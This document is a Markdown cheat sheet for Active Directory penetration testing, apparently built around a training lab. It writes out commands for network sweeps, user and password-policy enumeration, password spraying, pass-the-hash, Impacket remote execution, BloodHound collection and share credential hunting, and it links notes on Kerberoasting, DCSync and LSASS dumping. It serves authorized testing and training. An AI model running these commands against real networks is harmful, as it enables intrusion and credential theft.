# Active Directory Penetration Testing — Step-by-Step Cheat Sheet

> Command reference and methodology index for internal AD penetration tests.
> Companion command syntax lookup: https://wadcoms.github.io/

---

## 1. Host Reconnaissance and Network Enumeration

**Find active hosts**
```bash
sudo nmap -sn -n --max-retries 1 --max-rate 10 --data-length 24 192.168.1.0/24
fping -asgq 172.16.7.0/23
```

**Fast scan of a specific host**
```bash
nmap -p- -Pn -T4 --min-rate 2000 --stats-every 50 --max-retries 2 10.10.10.10
```

---

## 2. DNS Enumeration

Reference: [DNS Attacks and Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/DNS-Attack.md)

---

## 3. Subdomain Enumeration
Reference: [Subdomain Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Ffuf.md)

---

## 4. VHOST Enumeration
Reference: [VHOST Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Ffuf.md)

---

## 5. File Discovery
Reference: [File Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Ffuf.md)

---

## 6. Email and Comment Collector with ReconSpider
Reference: [ReconSpider](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Crawl%20Methods/ReconSpider.md)

---

## 7. Technology Enumeration
```powershell
Retire.js
Wappalyzer
BuiltWith
Shodan
JWT Debugger
ModHeader
SSL Certificate Viewer
HackBar
HackTools
```

---

## 8. Nikto and Nuclei
Reference: [Automation Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Nikto%20and%20Nuclei.md)

---

## 9. Web Application Enumeration
Reference: [CMS Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Applications/Web%20Applications.md)

---

## 10. API Endpoint Enumeration
Reference: [API Enumeration](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Web_Application/Exploitation/API-Abuse)

---

## 11. Web Initial Access
Reference: [Web Exploitation](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Web_Application/Exploitation)

---

## 12. Pivoting and Internal Network Discovery

**Ligolo-ng** is used for tunneling/pivoting into internal segments once an initial foothold is established.

**Windows — live host sweep**
```powershell
$path = "$env:USERPROFILE\Desktop\live_hosts.txt"
$subnet = "172.16.6"
1..254 | ForEach-Object {
    $ip = "$subnet.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -BufferSize 16 -Delay 1) {
        Write-Host "$ip Reply" -ForegroundColor Green
        $ip | Out-File -FilePath $path -Append
    }
}
```

**Linux — live host sweep**
```bash
#!/bin/bash
output_file="$HOME/Desktop/live_hosts.txt"
subnet="172.16.6"
trap "echo -e '\nScan interrupted by user. Exiting...'; exit" SIGINT
> "$output_file"
echo "Scanning subnet $subnet.0/24... Press Ctrl+C to stop."
for i in {1..254}; do
    ip="$subnet.$i"
    if ping -c 1 -W 1 "$ip" &> /dev/null; then
        echo "$ip Reply"
        echo "$ip" >> "$output_file"
    fi
done
echo "Scan complete."
```

**Metasploit — ping sweep through a session**
```
msf6 > use post/multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.16.5.0/24
msf6 post(multi/gather/ping_sweep) > set SESSION 1
msf6 post(multi/gather/ping_sweep) > run
```

---

## 13. Service Enumeration

Reference: [Service Enumeration notes](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services)

---

## 14. Vulnerability Scanning

Reference: [Service-specific attack notes](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services/Services-Attacks)

---

## 15. LDAP Enumeration

Reference: [LDAP Architecture & Queries](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Protocols/LDAP/LDAP-Architecture.md)

---

## 16. SMB Enumeration

Reference: [SMB Protocol Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/SMB-Attack.md)

---

## 17. LLMNR / mDNS / NBT-NS Poisoning

Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)

---

## 18. Credential Discovery (OSINT)

Reference: [Username & Password Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)

---

## 19. Password Policy Enumeration

```bash
# CrackMapExec
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# rpcclient (null session)
rpcclient -U "" -N 172.16.5.5
getdompwinfo

# enum4linux
enum4linux -P 172.16.5.5

# LDAP search
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**Windows**
```
net accounts
```

**PowerView**
```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

---

## 20. Username Enumeration

```bash
# OSINT wordlists
# https://github.com/insidetrust/statistically-likely-usernames
# https://github.com/initstring/linkedin2username

# enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# rpcclient
rpcclient -U "" -N 172.16.5.5
enumdomusers

# CrackMapExec
crackmapexec smb 172.16.5.5 --users
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

# LDAP search
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

> Also obtainable passively via **NTLM Relay** or **Responder** capture.

---

## 21. Password Spraying

**Linux**
```bash
for u in $(cat wordlist.txt); do
  rpcclient -U "username%password" -c "getusername;quit" 172.16.5.5 | grep Authority
done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

**Windows**
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## 22. Credentialed Enumeration

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

**rpcclient — user lookup**
```
rpcclient -U "" -N 172.16.5.5
enumdomusers
user:[administrator] rid:[0x1f4]
queryuser 0x1f4
```

**Remote command execution (Impacket)**
```bash
# https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
# https://github.com/fortra/impacket/blob/master/examples/psexec.py

psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

**windapsearch**
```bash
# https://github.com/ropnop/windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**BloodHound data collection**
```bash
# https://github.com/dirkjanm/BloodHound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

---

## 23. Credentialed Enumeration — From Windows

**Active Directory Module**
```powershell
Import-Module ActiveDirectory
Get-ADDomain
```

**Users, groups, and SPNs**
```powershell
# Users with an SPN set
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name

# Filtered SPN list
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,ServicePrincipalNames |
Where-Object {$_.ServicePrincipalName -match "HTTP/|MSSQL/|CIFS/"} |
Select Name, ServicePrincipalName

# Kerberoastable users
Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and ServicePrincipalNames -like "*/*"} -Properties ServicePrincipalName,ServicePrincipalNames |
Select Name, ServicePrincipalName | Sort Name

Get-ADTrust -Filter *
Get-ADGroup -Filter * | Select Name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

**PowerView essentials**
```powershell
# Specific user detail
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local |
Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Local admins on a host
Get-NetLocalGroupMember -ComputerName TARGETHOST -GroupName "Administrators"

# Disabled accounts
Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"

Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

**Snaffler — share/credential discovery**
```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
```

---

## 24. Living off the Land

Reference: [Maximizing information via PowerShell & CMD](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/Living%20Of%20The%20Land.md)

---

## 25. Local Privilege Escalation

Reference: [Windows Privilege Escalation](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Privilege%20Escalation/Windows)

---

## 26. PowerView Enumeration Checklist

Reference: [Full Enumeration with PowerView](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/PowerView.md)

---

## 27. AS-REP Roasting

Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)

---

## 28. Kerberoasting

Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)

---

## 29. Delegation Attacks

Reference: [RBCD, Unconstrained and Constrained Delegation Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Delegation-Abuse.md)

---

## 30. Active Directory Certificate Service Vulnerabilities

Reference: [ESC Vulnerabilities and Server Misconfiguration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Certificate%20Services/Vuln%20Enumerate.md)

## 31. LAPS Dumping

Reference: [Retrieve LAPS-managed local admin passwords](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)

---

## 32. DCSync Attacks

Reference: [Dump password hashes via DCSync](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/DCSync.md)

---

## 33. SAM / SECURITY / SYSTEM Hive Dumping

Reference: [Dump SAM, SECURITY, and SYSTEM hives for local hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/SAM-SYSTEM-SECURITY%20Dump.md)

---

## 34. LSASS Dumping

Reference: [LSASS memory dump techniques](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LSASS%20Dump.md)

---

## 35. NTDS.dit Dumping

Reference: [Dump domain-wide hashes from NTDS.dit](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTDS%20Dump.md)

---

## 36. Credential Manager / Windows Vault

Reference: [Extract stored credentials from Windows Credential Manager](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Windows%20Credential%20Manager.md)

---

## 37. noPAC + PrintNightmare + PetitPotam

Reference: [Combined exploitation chain](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/BleedingEdge.md)
